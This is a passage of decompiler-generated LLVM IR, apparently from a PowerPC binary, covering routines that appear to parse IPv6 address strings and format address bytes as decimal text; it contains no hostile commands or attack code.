  %v3_1000c268 = load i8, i8* %v2_1000c268, align 1
  %v4_1000c268 = zext i8 %v3_1000c268 to i32
  store i32 %v4_1000c268, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c268, i32* @r29, align 4
  %v3_1000c26c = icmp eq i8 %v3_1000c268, 58
  br i1 %v3_1000c26c, label %dec_label_pc_1000c274, label %dec_label_pc_1000c3f4

dec_label_pc_1000c274:                            ; preds = %dec_label_pc_1000c268, %dec_label_pc_1000c244
  %v0_1000c274 = phi i32 [ %v1_1000c268, %dec_label_pc_1000c268 ], [ %v0_1000c254, %dec_label_pc_1000c244 ]
  store i32 %v0_1000c274, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1000c3483036 = inttoptr i32 %v0_1000c274 to i8*
  %v2_1000c3483137 = load i8, i8* %v1_1000c3483036, align 1
  %v3_1000c3483238 = zext i8 %v2_1000c3483137 to i32
  store i32 %v3_1000c3483238, i32* %r3.global-to-local, align 4
  store i32 268485456, i32* @lr, align 4
  %v1_1000c34c3339 = call i32 @function_1000cff4(i32 %v3_1000c3483238)
  store i32 %v1_1000c34c3339, i32* %r3.global-to-local, align 4
  store i32 %v1_1000c34c3339, i32* @r30, align 4
  %v3_1000c3503440 = icmp eq i32 %v1_1000c34c3339, 0
  br i1 %v3_1000c3503440, label %dec_label_pc_1000c358, label %dec_label_pc_1000c280.lr.ph

dec_label_pc_1000c280:                            ; preds = %dec_label_pc_1000c280.lr.ph, %dec_label_pc_1000c348.backedge
  %v1_1000c34c35 = phi i32 [ %v1_1000c34c3341, %dec_label_pc_1000c280.lr.ph ], [ %v1_1000c34c, %dec_label_pc_1000c348.backedge ]
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1000f900.338 to i32), i32* @r25, align 4
  %v0_1000c28c = load i32, i32* @r29, align 4
  %v1_1000c28c = add i32 %v0_1000c28c, 1
  store i32 %v1_1000c28c, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1000f900.338 to i32), i32* @r3, align 4
  store i32 268485272, i32* @lr, align 4
  %v3_1000c294 = call i32 @function_1000d014(i32 ptrtoint ([17 x i8]* @global_var_1000f900.338 to i32), i32 %v1_1000c34c35)
  store i32 %v3_1000c294, i32* %r3.global-to-local, align 4
  %v3_1000c298 = icmp eq i32 %v3_1000c294, 0
  br i1 %v3_1000c298, label %dec_label_pc_1000c2b8, label %dec_label_pc_1000c2a0

dec_label_pc_1000c2a0:                            ; preds = %dec_label_pc_1000c280
  %v0_1000c2a0 = load i32, i32* @r25, align 4
  %v2_1000c2a0 = sub i32 %v3_1000c294, %v0_1000c2a0
  store i32 %v2_1000c2a0, i32* %r0.global-to-local, align 4
  %v0_1000c2a4 = load i32, i32* @r28, align 4
  %v1_1000c2a4 = mul i32 %v0_1000c2a4, 16
  store i32 %v1_1000c2a4, i32* %r9.global-to-local, align 4
  %v2_1000c2a8 = or i32 %v1_1000c2a4, %v2_1000c2a0
  store i32 %v2_1000c2a8, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_1000c2a8, 65536
  br i1 %tmp19, label %dec_label_pc_1000c344, label %dec_label_pc_1000c3f4

dec_label_pc_1000c2b8:                            ; preds = %dec_label_pc_1000c280
  %v0_1000c2b8 = load i32, i32* @r30, align 4
  %v3_1000c2b8 = icmp eq i32 %v0_1000c2b8, 58
  br i1 %v3_1000c2b8, label %dec_label_pc_1000c2c0, label %dec_label_pc_1000c314

dec_label_pc_1000c2c0:                            ; preds = %dec_label_pc_1000c2b8
  %v0_1000c2c0 = load i32, i32* @r23, align 4
  %v3_1000c2c0 = icmp eq i32 %v0_1000c2c0, 0
  br i1 %v3_1000c2c0, label %dec_label_pc_1000c2c8, label %dec_label_pc_1000c2dc

dec_label_pc_1000c2c8:                            ; preds = %dec_label_pc_1000c2c0
  %v0_1000c2c8 = load i32, i32* @r24, align 4
  %v3_1000c2c8 = icmp eq i32 %v0_1000c2c8, 0
  br i1 %v3_1000c2c8, label %dec_label_pc_1000c2d0, label %dec_label_pc_1000c3f4

dec_label_pc_1000c2d0:                            ; preds = %dec_label_pc_1000c2c8
  %v0_1000c2d0 = load i32, i32* @r31, align 4
  store i32 %v0_1000c2d0, i32* @r24, align 4
  %v0_1000c2d4 = load i32, i32* @r29, align 4
  store i32 %v0_1000c2d4, i32* @r26, align 4
  br label %dec_label_pc_1000c348.backedge

dec_label_pc_1000c2dc:                            ; preds = %dec_label_pc_1000c2c0
  %v0_1000c2dc = load i32, i32* @r29, align 4
  %v1_1000c2dc = inttoptr i32 %v0_1000c2dc to i8*
  %v2_1000c2dc = load i8, i8* %v1_1000c2dc, align 1
  %v3_1000c2dc = zext i8 %v2_1000c2dc to i32
  store i32 %v3_1000c2dc, i32* %r0.global-to-local, align 4
  %v3_1000c2e0 = icmp eq i8 %v2_1000c2dc, 0
  br i1 %v3_1000c2e0, label %dec_label_pc_1000c3f4, label %dec_label_pc_1000c2e8

dec_label_pc_1000c2e8:                            ; preds = %dec_label_pc_1000c2dc
  %v0_1000c2e8 = load i32, i32* @r31, align 4
  %v1_1000c2e8 = add i32 %v0_1000c2e8, 2
  store i32 %v1_1000c2e8, i32* %r0.global-to-local, align 4
  %v1_1000c2ec = load i32, i32* @r27, align 4
  %v3_1000c2ec = icmp ugt i32 %v1_1000c2e8, %v1_1000c2ec
  br i1 %v3_1000c2ec, label %dec_label_pc_1000c3f4, label %dec_label_pc_1000c2f4

dec_label_pc_1000c2f4:                            ; preds = %dec_label_pc_1000c2e8
  %v0_1000c2f4 = load i32, i32* @r28, align 4
  %v1_1000c2f4 = udiv i32 %v0_1000c2f4, 256
  store i32 %v1_1000c2f4, i32* %r0.global-to-local, align 4
  %v1_1000c2f8 = trunc i32 %v0_1000c2f4 to i8
  %v3_1000c2f8 = add i32 %v0_1000c2e8, 1
  %v4_1000c2f8 = inttoptr i32 %v3_1000c2f8 to i8*
  store i8 %v1_1000c2f8, i8* %v4_1000c2f8, align 1
  %v0_1000c2fc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c2fc = trunc i32 %v0_1000c2fc to i8
  %v2_1000c2fc = load i32, i32* @r31, align 4
  %v3_1000c2fc = inttoptr i32 %v2_1000c2fc to i8*
  store i8 %v1_1000c2fc, i8* %v3_1000c2fc, align 1
  %v0_1000c300 = load i32, i32* @r29, align 4
  store i32 %v0_1000c300, i32* @r26, align 4
  %v0_1000c304 = load i32, i32* @r31, align 4
  %v1_1000c304 = add i32 %v0_1000c304, 2
  store i32 %v1_1000c304, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1000c34830 = inttoptr i32 %v0_1000c300 to i8*
  %v2_1000c34831 = load i8, i8* %v1_1000c34830, align 1
  %v3_1000c34832 = zext i8 %v2_1000c34831 to i32
  store i32 %v3_1000c34832, i32* %r3.global-to-local, align 4
  store i32 268485456, i32* @lr, align 4
  %v1_1000c34c33 = call i32 @function_1000cff4(i32 %v3_1000c34832)
  store i32 %v1_1000c34c33, i32* %r3.global-to-local, align 4
  store i32 %v1_1000c34c33, i32* @r30, align 4
  %v3_1000c35034 = icmp eq i32 %v1_1000c34c33, 0
  br i1 %v3_1000c35034, label %dec_label_pc_1000c358, label %dec_label_pc_1000c280.lr.ph

dec_label_pc_1000c280.lr.ph:                      ; preds = %dec_label_pc_1000c274, %dec_label_pc_1000c2f4
  %v1_1000c34c3341 = phi i32 [ %v1_1000c34c33, %dec_label_pc_1000c2f4 ], [ %v1_1000c34c3339, %dec_label_pc_1000c274 ]
  br label %dec_label_pc_1000c280

dec_label_pc_1000c314:                            ; preds = %dec_label_pc_1000c2b8
  %v3_1000c314 = icmp eq i32 %v0_1000c2b8, 46
  br i1 %v3_1000c314, label %dec_label_pc_1000c31c, label %dec_label_pc_1000c3f4

dec_label_pc_1000c31c:                            ; preds = %dec_label_pc_1000c314
  %v0_1000c31c = load i32, i32* @r31, align 4
  %v1_1000c31c = add i32 %v0_1000c31c, 4
  store i32 %v1_1000c31c, i32* @r30, align 4
  %v1_1000c320 = load i32, i32* @r27, align 4
  %v3_1000c320 = icmp ugt i32 %v1_1000c31c, %v1_1000c320
  br i1 %v3_1000c320, label %dec_label_pc_1000c3f4, label %dec_label_pc_1000c328

dec_label_pc_1000c328:                            ; preds = %dec_label_pc_1000c31c
  %v0_1000c32c = load i32, i32* @r26, align 4
  store i32 %v0_1000c32c, i32* %r3.global-to-local, align 4
  store i32 268485428, i32* @lr, align 4
  %v3_1000c330 = call i32 @function_1000c124(i32 %v0_1000c32c, i32 %v0_1000c31c)
  store i32 %v3_1000c330, i32* %r3.global-to-local, align 4
  %v0_1000c334 = load i32, i32* @r30, align 4
  store i32 %v0_1000c334, i32* @r31, align 4
  %v2_1000c338 = icmp sgt i32 %v3_1000c330, 0
  br i1 %v2_1000c338, label %dec_label_pc_1000c37c, label %dec_label_pc_1000c3f4

dec_label_pc_1000c344:                            ; preds = %dec_label_pc_1000c2a0
  store i32 1, i32* @r23, align 4
  %v0_1000c348.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000c348.backedge

dec_label_pc_1000c348.backedge:                   ; preds = %dec_label_pc_1000c344, %dec_label_pc_1000c2d0
  %v0_1000c348.be = phi i32 [ %v0_1000c348.pre.pre, %dec_label_pc_1000c344 ], [ %v0_1000c2d4, %dec_label_pc_1000c2d0 ]
  %v1_1000c348 = inttoptr i32 %v0_1000c348.be to i8*
  %v2_1000c348 = load i8, i8* %v1_1000c348, align 1
  %v3_1000c348 = zext i8 %v2_1000c348 to i32
  store i32 %v3_1000c348, i32* %r3.global-to-local, align 4
  store i32 268485456, i32* @lr, align 4
  %v1_1000c34c = call i32 @function_1000cff4(i32 %v3_1000c348)
  store i32 %v1_1000c34c, i32* %r3.global-to-local, align 4
  store i32 %v1_1000c34c, i32* @r30, align 4
  %v3_1000c350 = icmp eq i32 %v1_1000c34c, 0
  br i1 %v3_1000c350, label %dec_label_pc_1000c358, label %dec_label_pc_1000c280

dec_label_pc_1000c358:                            ; preds = %dec_label_pc_1000c348.backedge, %dec_label_pc_1000c274, %dec_label_pc_1000c2f4
  %v0_1000c358 = load i32, i32* @r23, align 4
  %v3_1000c358 = icmp eq i32 %v0_1000c358, 0
  %v0_1000c3c0.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000c358, label %dec_label_pc_1000c37c, label %dec_label_pc_1000c360

dec_label_pc_1000c360:                            ; preds = %dec_label_pc_1000c358
  %v1_1000c360 = add i32 %v0_1000c3c0.pre.pre, 2
  store i32 %v1_1000c360, i32* %r0.global-to-local, align 4
  %v1_1000c364 = load i32, i32* @r27, align 4
  %v3_1000c364 = icmp ugt i32 %v1_1000c360, %v1_1000c364
  br i1 %v3_1000c364, label %dec_label_pc_1000c3f4, label %dec_label_pc_1000c36c

dec_label_pc_1000c36c:                            ; preds = %dec_label_pc_1000c360
  %v0_1000c36c = load i32, i32* @r28, align 4
  %v1_1000c36c = udiv i32 %v0_1000c36c, 256
  store i32 %v1_1000c36c, i32* %r0.global-to-local, align 4
  %v1_1000c370 = trunc i32 %v0_1000c36c to i8
  %v3_1000c370 = add i32 %v0_1000c3c0.pre.pre, 1
  %v4_1000c370 = inttoptr i32 %v3_1000c370 to i8*
  store i8 %v1_1000c370, i8* %v4_1000c370, align 1
  %v0_1000c374 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c374 = trunc i32 %v0_1000c374 to i8
  %v2_1000c374 = load i32, i32* @r31, align 4
  %v3_1000c374 = inttoptr i32 %v2_1000c374 to i8*
  store i8 %v1_1000c374, i8* %v3_1000c374, align 1
  %v0_1000c378 = load i32, i32* @r31, align 4
  %v1_1000c378 = add i32 %v0_1000c378, 2
  store i32 %v1_1000c378, i32* @r31, align 4
  br label %dec_label_pc_1000c37c

dec_label_pc_1000c37c:                            ; preds = %dec_label_pc_1000c358, %dec_label_pc_1000c328, %dec_label_pc_1000c36c
  %v0_1000c3c0.pre = phi i32 [ %v0_1000c334, %dec_label_pc_1000c328 ], [ %v1_1000c378, %dec_label_pc_1000c36c ], [ %v0_1000c3c0.pre.pre, %dec_label_pc_1000c358 ]
  %v0_1000c37c = load i32, i32* @r24, align 4
  %v3_1000c37c = icmp eq i32 %v0_1000c37c, 0
  %v1_1000c3c0.pre = load i32, i32* @r27, align 4
  %v4_1000c3c0 = icmp eq i32 %v0_1000c3c0.pre, %v1_1000c3c0.pre
  br i1 %v3_1000c37c, label %dec_label_pc_1000c3c0, label %dec_label_pc_1000c384

dec_label_pc_1000c384:                            ; preds = %dec_label_pc_1000c37c
  %v2_1000c388 = sub i32 %v0_1000c3c0.pre, %v0_1000c37c
  store i32 %v2_1000c388, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_1000c3c0, label %dec_label_pc_1000c3f4, label %dec_label_pc_1000c3a8.preheader

dec_label_pc_1000c3a8.preheader:                  ; preds = %dec_label_pc_1000c384
  %v3_1000c3a824 = icmp slt i32 %v2_1000c388, 1
  %v2_1000c3ac26 = add i32 %v2_1000c388, -1
  store i32 %v2_1000c3ac26, i32* %r10.global-to-local, align 4
  %v2_1000c3b027 = add i32 %v1_1000c3c0.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_1000c3a824, label %dec_label_pc_1000c3c0.thread, label %dec_label_pc_1000c39c

dec_label_pc_1000c39c:                            ; preds = %dec_label_pc_1000c3a8.preheader, %dec_label_pc_1000c39c.dec_label_pc_1000c39c_crit_edge
  %v0_1000c39c = phi i32 [ %v0_1000c39c.pre, %dec_label_pc_1000c39c.dec_label_pc_1000c39c_crit_edge ], [ %v0_1000c37c, %dec_label_pc_1000c3a8.preheader ]
  %v2_1000c3b029 = phi i32 [ %v2_1000c3b0, %dec_label_pc_1000c39c.dec_label_pc_1000c39c_crit_edge ], [ %v2_1000c3b027, %dec_label_pc_1000c3a8.preheader ]
  %v2_1000c3ac28 = phi i32 [ %v2_1000c3ac, %dec_label_pc_1000c39c.dec_label_pc_1000c39c_crit_edge ], [ %v2_1000c3ac26, %dec_label_pc_1000c3a8.preheader ]
  %v2_1000c39c = add i32 %v0_1000c39c, %v2_1000c3ac28
  %v3_1000c39c = inttoptr i32 %v2_1000c39c to i8*
  %v4_1000c39c = load i8, i8* %v3_1000c39c, align 1
  %v5_1000c39c = zext i8 %v4_1000c39c to i32
  store i32 %v5_1000c39c, i32* %r0.global-to-local, align 4
  %v3_1000c3a0 = inttoptr i32 %v2_1000c3b029 to i8*
  store i8 %v4_1000c39c, i8* %v3_1000c3a0, align 1
  %v0_1000c3a4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c3a4 = load i32, i32* @r24, align 4
  %v2_1000c3a4 = load i32, i32* %r10.global-to-local, align 4
  %v3_1000c3a4 = trunc i32 %v0_1000c3a4 to i8
  %v4_1000c3a4 = add i32 %v2_1000c3a4, %v1_1000c3a4
  %v5_1000c3a4 = inttoptr i32 %v4_1000c3a4 to i8*
  store i8 %v3_1000c3a4, i8* %v5_1000c3a4, align 1
  %v0_1000c3a8.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c3a8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1000c3b0.pre = load i32, i32* @r27, align 4
  %v3_1000c3a8 = icmp slt i32 %v1_1000c3a8.pre, %v0_1000c3a8.pre
  %v2_1000c3ac = sub i32 %v1_1000c3a8.pre, %v0_1000c3a8.pre
  store i32 %v2_1000c3ac, i32* %r10.global-to-local, align 4
  %v1_1000c3b4 = add i32 %v0_1000c3a8.pre, 1
  store i32 %v1_1000c3b4, i32* %r9.global-to-local, align 4
  br i1 %v3_1000c3a8, label %dec_label_pc_1000c3c0.thread, label %dec_label_pc_1000c39c.dec_label_pc_1000c39c_crit_edge

dec_label_pc_1000c39c.dec_label_pc_1000c39c_crit_edge: ; preds = %dec_label_pc_1000c39c
  %v2_1000c3b0 = sub i32 %v1_1000c3b0.pre, %v0_1000c3a8.pre
  %v0_1000c39c.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_1000c39c

dec_label_pc_1000c3c0.thread:                     ; preds = %dec_label_pc_1000c39c, %dec_label_pc_1000c3a8.preheader
  %v0_1000c3bc.lcssa = phi i32 [ %v1_1000c3c0.pre, %dec_label_pc_1000c3a8.preheader ], [ %v1_1000c3b0.pre, %dec_label_pc_1000c39c ]
  store i32 %v0_1000c3bc.lcssa, i32* @r31, align 4
  br label %dec_label_pc_1000c3c8

dec_label_pc_1000c3c0:                            ; preds = %dec_label_pc_1000c37c
  br i1 %v4_1000c3c0, label %dec_label_pc_1000c3c8, label %dec_label_pc_1000c3f4

dec_label_pc_1000c3c8:                            ; preds = %dec_label_pc_1000c3c0.thread, %dec_label_pc_1000c3c0
  %v0_1000c3c8 = load i32, i32* @r22, align 4
  store i32 %v0_1000c3c8, i32* @r3, align 4
  store i32 %v2_1000c244, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c3d8.339 to i32), i32* @lr, align 4
  %v0_1000c3d4 = call i32 @function_10007108()
  store i32 %v0_1000c3d4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c3f8

dec_label_pc_1000c3e0:                            ; preds = %dec_label_pc_1000c224
  %v0_1000c3e0 = call i32 @function_10004e38()
  store i32 %v0_1000c3e0, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000c3ec = inttoptr i32 %v0_1000c3e0 to i32*
  store i32 97, i32* %v2_1000c3ec, align 4
  %v0_1000c3fc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c3f8

dec_label_pc_1000c3f4:                            ; preds = %dec_label_pc_1000c2e8, %dec_label_pc_1000c2dc, %dec_label_pc_1000c2a0, %dec_label_pc_1000c2c8, %dec_label_pc_1000c384, %dec_label_pc_1000c328, %dec_label_pc_1000c314, %dec_label_pc_1000c3c0, %dec_label_pc_1000c268, %dec_label_pc_1000c360, %dec_label_pc_1000c31c
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c3f8

dec_label_pc_1000c3f8:                            ; preds = %dec_label_pc_1000c3e0, %dec_label_pc_1000c3c8, %dec_label_pc_1000c230, %dec_label_pc_1000c3f4
  %v0_1000c3fc = phi i32 [ %v0_1000c3fc.pre, %dec_label_pc_1000c3e0 ], [ 1, %dec_label_pc_1000c3c8 ], [ %v3_1000c238, %dec_label_pc_1000c230 ], [ 0, %dec_label_pc_1000c3f4 ]
  store i32 %v0_1000c208, i32* %r0.global-to-local, align 4
  store i32 %v0_1000c3fc, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000c3fc

; uselistorder directives
  uselistorder i32 %v0_1000c3fc, { 1, 0 }
  uselistorder i32 %v2_1000c3ac, { 1, 0 }
  uselistorder i32 %v0_1000c3a8.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_1000c3c0, { 1, 0 }
  uselistorder i32 %v0_1000c3c0.pre, { 1, 0 }
  uselistorder i32 %v0_1000c36c, { 1, 0 }
  uselistorder i32 %v0_1000c3c0.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000c34c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000c2f4, { 1, 0 }
  uselistorder i32 %v1_1000c2a4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 3, 1, 2, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 8, 9, 13, 14, 10, 11, 2, 1, 12, 4, 3, 15, 16, 17, 18, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_1000cff4, { 2, 1, 0 }
  uselistorder i32 268485456, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_1000c124, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c3f8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c3f4, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_1000c3c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c39c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c37c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c358, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c280.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1000c280, { 1, 0 }
}

define i32 @function_1000c410(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c468.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_1000c410 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_1000c43c = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_1000c43c, i32* %r3.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_1000c44c.342 to i32), i32* @lr, align 4
  %v3_1000c448 = call i32 @function_100071a4(i32 %v2_1000c43c, i32 0, i32 15)
  store i32 %v3_1000c448, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_1000c50c2 = load i32, i32* @r1, align 4
  store i32 %v0_1000c50c2, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000c468

dec_label_pc_1000c468:                            ; preds = %dec_label_pc_1000c4dc.dec_label_pc_1000c468_crit_edge, %dec_label_pc_1000c468.lr.ph
  %v2_1000c488 = phi i32 [ %v2_1000c50c, %dec_label_pc_1000c4dc.dec_label_pc_1000c468_crit_edge ], [ %v0_1000c50c2, %dec_label_pc_1000c468.lr.ph ]
  %v0_1000c47c = phi i32 [ %v0_1000c50c, %dec_label_pc_1000c4dc.dec_label_pc_1000c468_crit_edge ], [ %v0_1000c50c2, %dec_label_pc_1000c468.lr.ph ]
  %v0_1000c46c = phi i32 [ %v1_1000c50c, %dec_label_pc_1000c4dc.dec_label_pc_1000c468_crit_edge ], [ 0, %dec_label_pc_1000c468.lr.ph ]
  %v1_1000c474 = phi i32 [ %v1_1000c468.pre, %dec_label_pc_1000c4dc.dec_label_pc_1000c468_crit_edge ], [ 0, %dec_label_pc_1000c468.lr.ph ]
  %v0_1000c468 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c468 = add i32 %v0_1000c468, %v1_1000c474
  %v3_1000c468 = inttoptr i32 %v2_1000c468 to i8*
  %v4_1000c468 = load i8, i8* %v3_1000c468, align 1
  %v5_1000c468 = zext i8 %v4_1000c468 to i32
  store i32 %v5_1000c468, i32* %r10.global-to-local, align 4
  store i32 %v0_1000c46c, i32* %r8.global-to-local, align 4
  %v1_1000c470 = add i32 %v0_1000c46c, 1
  store i32 %v1_1000c470, i32* %r11.global-to-local, align 4
  store i32 %v2_1000c468, i32* %r3.global-to-local, align 4
  %v1_1000c478 = load i32, i32* @r28, align 4
  %v2_1000c478 = udiv i32 %v5_1000c468, %v1_1000c478
  %v2_1000c47c = add i32 %v1_1000c470, %v0_1000c47c
  store i32 %v2_1000c47c, i32* %r6.global-to-local, align 4
  %v1_1000c480 = add nuw nsw i32 %v2_1000c478, 48
  %v1_1000c484 = urem i32 %v1_1000c480, 256
  store i32 %v1_1000c484, i32* %r0.global-to-local, align 4
  %v1_1000c488 = trunc i32 %v1_1000c480 to i8
  %v3_1000c488 = add i32 %v2_1000c488, 8
  %v4_1000c488 = inttoptr i32 %v3_1000c488 to i8*
  store i8 %v1_1000c488, i8* %v4_1000c488, align 1
  %v0_1000c48c = load i32, i32* %r0.global-to-local, align 4
  %v3_1000c48c = icmp eq i32 %v0_1000c48c, 48
  %v0_1000c494 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c494 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000c494 = udiv i32 %v0_1000c494, %v1_1000c494
  store i32 %v2_1000c494, i32* %r9.global-to-local, align 4
  br i1 %v3_1000c48c, label %dec_label_pc_1000c494, label %dec_label_pc_1000c4c0

dec_label_pc_1000c494:                            ; preds = %dec_label_pc_1000c468
  %v2_1000c498 = udiv i32 %v2_1000c494, %v1_1000c494
  %tmp18 = mul i32 %v2_1000c498, -10
  %v2_1000c4a0 = add i32 %v2_1000c494, 48
  %v1_1000c4a4 = add i32 %v2_1000c4a0, %tmp18
  store i32 %v1_1000c4a4, i32* %r9.global-to-local, align 4
  %v1_1000c4a8 = urem i32 %v1_1000c4a4, 256
  store i32 %v1_1000c4a8, i32* %r0.global-to-local, align 4
  %v1_1000c4ac = trunc i32 %v1_1000c4a4 to i8
  %v2_1000c4ac = load i32, i32* %r7.global-to-local, align 4
  %v3_1000c4ac = add i32 %v2_1000c4ac, 8
  %v4_1000c4ac = inttoptr i32 %v3_1000c4ac to i8*
  store i8 %v1_1000c4ac, i8* %v4_1000c4ac, align 1
  %v0_1000c4b0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000c4b0 = icmp eq i32 %v0_1000c4b0, 48
  br i1 %v3_1000c4b0, label %dec_label_pc_1000c4dc, label %dec_label_pc_1000c4b8

dec_label_pc_1000c4b8:                            ; preds = %dec_label_pc_1000c494
  %v0_1000c4b8 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000c4b8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000c4dc

dec_label_pc_1000c4c0:                            ; preds = %dec_label_pc_1000c468
  %v0_1000c4c4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c4c4 = add i32 %v0_1000c4c4, 1
  store i32 %v1_1000c4c4, i32* %r8.global-to-local, align 4
  %v2_1000c4c8 = udiv i32 %v2_1000c494, %v1_1000c494
  %v1_1000c4cc = mul i32 %v2_1000c4c8, 10
  store i32 %v1_1000c4cc, i32* %r0.global-to-local, align 4
  %v2_1000c4d0 = sub i32 %v2_1000c494, %v1_1000c4cc
  %v1_1000c4d4 = add i32 %v2_1000c4d0, 48
  store i32 %v1_1000c4d4, i32* %r9.global-to-local, align 4
  %v1_1000c4d8 = trunc i32 %v1_1000c4d4 to i8
  %v2_1000c4d8 = load i32, i32* %r6.global-to-local, align 4
  %v3_1000c4d8 = add i32 %v2_1000c4d8, 8
  %v4_1000c4d8 = inttoptr i32 %v3_1000c4d8 to i8*
  store i8 %v1_1000c4d8, i8* %v4_1000c4d8, align 1
  br label %dec_label_pc_1000c4dc

dec_label_pc_1000c4dc:                            ; preds = %dec_label_pc_1000c494, %dec_label_pc_1000c4b8, %dec_label_pc_1000c4c0
  %v0_1000c4dc = load i32, i32* %r3.global-to-local, align 4
  %v1_1000c4dc = inttoptr i32 %v0_1000c4dc to i8*
  %v2_1000c4dc = load i8, i8* %v1_1000c4dc, align 1
  %v3_1000c4dc = zext i8 %v2_1000c4dc to i32
  %v0_1000c4e0 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c4e0 = add i32 %v0_1000c4e0, 1
  %v0_1000c4e4 = load i32, i32* @r1, align 4
  %v2_1000c4e4 = add i32 %v0_1000c4e4, %v0_1000c4e0
  store i32 %v2_1000c4e4, i32* %r10.global-to-local, align 4
  %v2_1000c4e8 = add i32 %v1_1000c4e0, %v0_1000c4e4
  store i32 %v2_1000c4e8, i32* %r8.global-to-local, align 4
  %v1_1000c4ec = load i32, i32* %r5.global-to-local, align 4
  %v2_1000c4ec = udiv i32 %v3_1000c4dc, %v1_1000c4ec
  %v1_1000c4f0 = add i32 %v0_1000c4e0, 2
  store i32 %v1_1000c4f0, i32* %r11.global-to-local, align 4
  %v0_1000c4f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000c4f4 = add i32 %v0_1000c4f4, 1
  store i32 %v1_1000c4f4, i32* %r4.global-to-local, align 4
  %v1_1000c4f8 = mul nuw nsw i32 %v2_1000c4ec, 10
  store i32 %v1_1000c4f8, i32* %r0.global-to-local, align 4
  %v2_1000c4fc = sub nsw i32 %v3_1000c4dc, %v1_1000c4f8
